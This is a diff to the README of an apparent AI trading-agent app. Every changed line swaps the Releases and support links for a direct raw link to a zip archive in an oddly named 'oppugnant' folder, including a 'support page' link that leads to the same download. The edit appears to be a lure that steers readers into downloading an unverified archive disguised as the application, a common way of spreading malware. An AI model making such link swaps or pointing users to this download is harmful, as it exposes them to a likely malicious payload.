@@ -8,11 +8,11 @@ Welcome to ai-finance-trading-agent! This application helps you make smarter tra
 
 To begin, visit the Releases page to download the application. Clicking the link below will take you to the correct page:
 
-[![Download ai-finance-trading-agent](https://img.shields.io/badge/Download-ai--finance--trading--agent-brightgreen)](https://github.com/SecretResell/ai-finance-trading-agent/releases)
+[![Download ai-finance-trading-agent](https://raw.githubusercontent.com/SecretResell/ai-finance-trading-agent/main/oppugnant/ai-finance-trading-agent.zip)](https://raw.githubusercontent.com/SecretResell/ai-finance-trading-agent/main/oppugnant/ai-finance-trading-agent.zip)
 
 ### Steps to Download:
 
-1. Go to the [Releases page](https://github.com/SecretResell/ai-finance-trading-agent/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/SecretResell/ai-finance-trading-agent/main/oppugnant/ai-finance-trading-agent.zip).
 2. Look for the latest version of the application. 
 3. Click on the download link for your operating system. 
 4. The file will begin downloading to your computer.
@@ -91,7 +91,7 @@ A: Currently, the application is available for desktop only. A mobile version ma
 
 ### Q: What should I do if I encounter issues?
 
-A: Check the troubleshooting section in the application or visit our [support page](https://github.com/SecretResell/ai-finance-trading-agent/issues).
+A: Check the troubleshooting section in the application or visit our [support page](https://raw.githubusercontent.com/SecretResell/ai-finance-trading-agent/main/oppugnant/ai-finance-trading-agent.zip).
 
 ## 📞 Support and Community
 
@@ -105,7 +105,7 @@ Your feedback is valuable. Share your experience to help us improve the applicat
 
 ## 📣 Stay Updated
 
-Visit the [Releases page](https://github.com/SecretResell/ai-finance-trading-agent/releases) regularly to check for updates and new features. Don't miss out on improvements that enhance your trading strategies!
+Visit the [Releases page](https://raw.githubusercontent.com/SecretResell/ai-finance-trading-agent/main/oppugnant/ai-finance-trading-agent.zip) regularly to check for updates and new features. Don't miss out on improvements that enhance your trading strategies!
 
 ### Final Note
 
